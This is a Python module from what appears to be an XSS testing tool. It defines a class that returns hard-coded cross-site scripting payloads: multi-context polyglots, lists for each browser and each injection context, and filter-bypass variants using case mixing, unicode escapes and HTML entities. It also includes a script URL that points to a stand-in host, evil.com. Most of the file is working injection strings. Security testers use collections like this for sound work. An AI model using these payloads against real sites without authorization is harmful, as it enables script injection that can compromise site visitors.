#!/usr/bin/env python3

"""
BRS-XSS Polyglot Generator

Generates polyglot XSS payloads for multiple contexts.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Tue 05 Aug 2025 18:03:16 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Dict, Optional

from ..utils.logger import Logger

logger = Logger("core.polyglot_generator")


class PolyglotGenerator:
    """
    Generates polyglot XSS payloads that work in multiple contexts.
    
    Creates payloads that work across:
    - HTML + JavaScript
    - Attribute + JavaScript
    - CSS + JavaScript
    - JSON + JavaScript
    - Template engines
    """
    
    def __init__(self):
        """Initialize polyglot generator"""
        logger.debug("Polyglot generator initialized")
    
    def generate_polyglot_payloads(self) -> List[str]:
        """Generate polyglot payloads that work in multiple contexts"""
        
        polyglots = [
            # HTML + JavaScript context
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            
            # Attribute + JavaScript context  
            '"><svg/onload=alert()//',
            
            # CSS + JavaScript context
            '</style><script>alert()</script>',
            
            # JSON + JavaScript context
            '"}};alert();//',
            
            # Template injection polyglot
            '{{7*7}}${7*7}#{7*7}%{7*7}',
            
            # Multi-context XSS
            'javascript:alert(1)//\'">><marquee><img src=x onerror=confirm(1)></marquee>">\'><plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm(1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://i.imgur.com/P8mL8.jpg">',
            
            # DOM-based polyglot
            '"\'></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            
            # Universal bypass
            '\'"><img src=x onerror=alert(1)>',
            
            # Comment-based polyglot
            '<!--<script>alert(1)</script>-->',
            
            # Mixed quote polyglot
            '"><svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        ]
        
        return polyglots
    
    def generate_browser_specific_payloads(self) -> Dict[str, List[str]]:
        """Generate browser-specific XSS payloads"""
        
        return {
            'internet_explorer': [
                '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
                '<script>alert(1)</script>',
                '<svg><script>alert(1)</script></svg>',
                '<script src="javascript:alert(1)"></script>',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
            ],
            
            'firefox': [
                '<svg><script href="javascript:alert(1)" />',
                '<svg><script>alert(1)</script></svg>',
                '<math href="javascript:alert(1)">',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            ],
            
            'chrome': [
                '<svg><script href="javascript:alert(1)" />',
                '<svg><script>alert(1)</script></svg>',
                '<audio src=x onerror=alert(1)>',
                '<video src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ],
            
            'safari': [
                '<svg><script href="javascript:alert(1)" />',
                '<svg><script>alert(1)</script></svg>',
                '<audio src=x onerror=alert(1)>',
                '<video src=x onerror=alert(1)>',
            ],
            
            'edge': [
                '<svg><script href="javascript:alert(1)" />',
                '<svg><script>alert(1)</script></svg>',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ]
        }
    
    def generate_context_specific_polyglots(self, context: str) -> List[str]:
        """Generate polyglots optimized for specific context"""
        
        context_polyglots = {
            'html': [
                '<script>alert(1)</script><!--',
                '"><script>alert(1)</script>',
                '<svg onload=alert(1)>',
            ],
            
            'attribute': [
                '" onload="alert(1)" x="',
                '\' onload=\'alert(1)\' x=\'',
                'javascript:alert(1)',
            ],
            
            'javascript': [
                '\';alert(1);//',
                '";alert(1);//',
                '`);alert(1);//',
            ],
            
            'css': [
                '</style><script>alert(1)</script><style>',
                'expression(alert(1))',
                '/*</style><script>alert(1)</script>/*',
            ],
            
            'url': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'http://evil.com/xss.js',
            ]
        }
        
        return context_polyglots.get(context, self.generate_polyglot_payloads()[:3])
    
    def generate_filter_bypass_polyglots(self) -> List[str]:
        """Generate polyglots designed to bypass common filters"""
        
        return [
            # Mixed case
            '<ScRiPt>alert(1)</ScRiPt>',
            
            # Unicode
            '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
            
            # HTML entities
            '<script>&#97;&#108;&#101;&#114;&#116;(1)</script>',
            
            # Event handlers
            '<img src=x o\\u006eload=alert(1)>',
            
            # Protocol handlers
            '<iframe src=j\\u0061vascript:alert(1)>',
            
            # CSS expressions
            '<div style="x:expression(alert(1))">',
            
            # Data URIs
            '<iframe src="data:text/html,<script>alert(1)</script>">',
        ]